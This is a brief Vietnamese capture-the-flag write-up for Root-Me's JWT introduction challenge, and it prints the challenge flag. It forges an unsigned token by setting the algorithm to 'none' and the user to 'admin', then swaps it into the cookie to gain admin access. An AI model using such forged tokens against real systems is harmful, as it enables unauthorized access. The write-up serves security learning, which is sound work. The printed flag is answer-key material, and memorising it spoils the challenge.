# [JSON Web Token (JWT) - Introduction](https://www.root-me.org/en/Challenges/Web-Server/JSON-Web-Token-JWT-Introduction)

## Solutions

- Đăng nhập với guest, base64 decode cookie jwt ta được:

```json
{"typ":"JWT","alg":"HS256"}{"username":"guest"}g`^;aeI}3]
```

- Thay đổi nội dung:

```json
{"typ":"JWT","alg":"none"}{"username":"admin"}
```

- Base64 encode với ký tự `.` ngăn cách các json object, ta được:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

- Dùng burp suite hoặc devtool thay đổi cookie jwt và gửi lại request

Kết quả:

- Flag xuất hiện ở response: `S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7`
